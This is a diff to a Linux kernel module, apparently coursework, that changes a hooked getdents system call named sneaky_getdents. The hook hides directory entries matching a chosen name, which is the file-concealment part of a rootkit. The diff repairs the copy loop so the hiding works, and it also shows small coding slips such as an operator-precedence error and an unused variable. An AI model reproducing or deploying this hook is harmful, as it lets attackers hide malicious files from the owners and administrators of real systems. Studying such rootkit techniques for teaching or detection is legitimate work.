@@ -81,12 +81,14 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   
   //initial Direct structure
   struct linux_dirent *dir;
-
+  //initialize digits
+  size_t SNEAKYSIZE = sizeof(SNEAKY)-1;
+  
   //cast dirent structure to char * to manipulate byte by byte
-  char *exact = (char *) dirp;
+  char * mychar = (char *) dirp;
   //allocate memory for count bytes associated with all dirents read for specific file descriptor 
   //we are in kernel space so allocate memory from kernel memory
-  char *mem = kmalloc(count, GFP_KERNEL);
+  char* mem = kmalloc(count, GFP_KERNEL);
   //We ran out of kernel space --> send back correct Kernel Error Macro
   if (mem == NULL) {
     return -ENOMEM;
@@ -97,30 +99,36 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   // pass addresses derived from Kernel Space to our system calls 
   set_fs(KERNEL_DS);
   //syscall
-  long numbytes = getdents_original(fd, (struct linux_dirent*) mem, count);
+  long numbytes= getdents_original(fd, (struct linux_dirent*) mem, count);
   //ensure addresses are once again only in user space
   set_fs(userspace);
 
   //iterate through numbytes
-  for (long i = j = 0; i < numbytes; i+= dir->d_reclen) {
+  long i, j, found_block;
+  unsigned long result;
+  for (i = j = 0; i < numbytes; i+= dir->d_reclen) {
     dir = (struct linux_dirent *) (mem + i);
     
     //Dirent name matches our executable name --> DO NOT COPY TO USER SPACE
-    if(strncmp(dir->d_name, SNEAKY, SNEAKY_SIZE) == 0) {
+    if(strncmp(dir->d_name, SNEAKY, SNEAKYSIZE) == 0) {
+      found_block = dir->d_reclen;
       continue;
     }
-    if (copy_to_user(exact + j, dir, dir->d_reclen)) {
-      //numbytes = -EAGAIN;
+    //copy kernel memory to dirent in user space casted as char* 
+    if (result = copy_to_user(mychar + j, dir,dir->d_reclen)!= 0) {
+      //if failure: free our buffer
       kfree(mem);
+      //exit
       return -EAGAIN;
     }
+    j += dir->d_reclen;
   }
+  
   //changes numbytes to j
   if (numbytes > 0) {
     numbytes = j;
   }
-
-  //deallocate and return
+  
   kfree(mem);
   return numbytes;
 }
